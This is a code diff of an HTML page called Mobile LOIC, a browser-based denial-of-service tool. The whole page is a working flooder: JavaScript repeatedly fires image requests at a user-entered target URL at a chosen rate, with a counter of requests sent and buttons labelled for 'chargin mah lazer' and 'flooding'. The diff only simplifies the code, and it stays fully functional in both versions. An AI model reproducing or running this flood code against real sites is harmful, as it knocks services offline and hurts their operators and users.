@@ -1,126 +1,42 @@
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 <title>Mobile LOIC</title>
-<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;" />
-<style type="text/css">
-body { font-family: Helvetica; font-size: 16px; }
-
-input {
-	width: 250px;
-	height: 30px;
-	font-size: 14px;
-	font-weight: bold;
-	margin-bottom: 20px;
-}
-
-button {
-	width: 250px;
-	height: 60px;
-	font-size: 14px;
-	font-weight: bold;
-	margin-bottom: 20px;
-}
-
-#container {
-	padding-top: 20px;
-	overflow: auto;
-	text-align: center;
-}
-
-.title {
-	font-size: 16px;
-	font-weight: bold;
-	font-style: italic;
-	padding-bottom: 5px;
-}
-
-.required {
-	color: #d74646;
-	font-size: 25px;
-	font-weight: bold;
-	font-style: italic;
-}
-
-.success {
-	font-size: 16px;
-	font-weight: bold;
-	font-style: italic;
-	padding-bottom: 5px;
-}
-
-.number {
-	color: #363635;
-	font-family: Helvetica;
-	font-size: 40px;
-	font-weight: bold;
-	padding-bottom: 5px;
-}
-
-#footer {
-	font-size: 12px;
-	font-style: italic;
-	margin-top: 10px;
-}
-</style>
+<style type="text/css">input, button { width: 250px; height: 30px; font-size: 20px; font-weight: bold; margin: 20px 0 20px 0; }</style>
 </head>
-<body>
-<div id="container">
+<body style="font-family: Helvetica; font-size: 16px; text-align: center">
 <h1>Mobile LOIC</h1>
-<div class="title"><span class="required">*</span>Target URL</div>
-<input type="text" id="targetURL" value="" />
+<div class="title"><span style="color: red">*</span>Target URL</div>
+<input type="text" id="targetURL" />
 <div class="title">Requests per Second</div>
-<input type="text" id="rps" value="10" style="" />
-<div><button id="fireButton" style="">IMMA' CHARGIN' MAH LAZER</button></div>
-<div class="success">Requests Sent</div>
-<div class="number" id="succeededCtr">0</div>
-<div id="footer">Developed at <a href="https://github.com/mcandre/mobile-loic">Mobile LOIC GitHub</a></div>
+<input type="text" id="rps" value="10" /><br/>
+<button id="fireButton" style="height: 60px; font-size: 14px">IMMA CHARGIN MAH LAZER</button>
+<div style="color: #8cbc26">Requests Sent</div>
+<div style="font-size: 40px; margin-bottom: 20px" id="succeededCtr">0</div>
+<div style="font-size: 12px; font-style: italic">Development at <a href="https://github.com/mcandre/mobile-loic">Mobile LOIC Github</a></div>
 <script>
 var fireInterval;
 var isFiring = false;
 
-var succeededCtrNode = document.getElementById("succeededCtr"),
-	targetURLNode = document.getElementById("targetURL"),
-	fireButton = document.getElementById("fireButton"),
-	rpsNode = document.getElementById("rps"),
-	timeoutNode = document.getElementById("timeout");
-
-var targetURL = targetURLNode.value;
-
-targetURLNode.onchange = function () { targetURL = this.value; };
-
-var requestsHT = {};
-
-var succeededCtr = 0;
-
-var makeHttpRequest = function () {
-	var rID =Number(new Date());
-	var img = new Image();
-	img.onerror = function () { onSuccess(rID); };
-	img.onabort = function () { onSuccess(rID); };
-	img.onload = function () { onSuccess(rID); };
-
-	img.setAttribute("src", targetURL + "?id=" + rID);
-	requestsHT[rID] = img;
-};
-
-var onSuccess = function (rID) {
-	succeededCtr++;
-	succeededCtrNode.innerHTML = succeededCtr;
-	delete requestsHT[rID];
-};
-
-fireButton.onclick = function () {
+document.getElementById("fireButton").onclick = function () {
 	if (isFiring) {
 		clearInterval(fireInterval);
 		isFiring = false;
-		this.innerHTML = "IMMA\' CHARGIN\' MAH LAZER";
-	} else {
+		this.innerHTML = "IMMA CHARGIN MAH LAZER";
+	}
+	else {
 		isFiring = true;
 		this.innerHTML = "STOP TEH FLOODING";
+		fireInterval = setInterval(
+			function () {
+				var img = new Image();
 
-		fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+				// URL may not be an image
+				img.onerror = img.onabort = img.onload = function() { document.getElementById("succeededCtr").innerHTML++; };
+
+				img.setAttribute("src", document.getElementById("targetURL").value);
+			},
+			(1000 / parseInt(document.getElementById("rps").value) | 0)
+		);
 	}
 };
 </script>
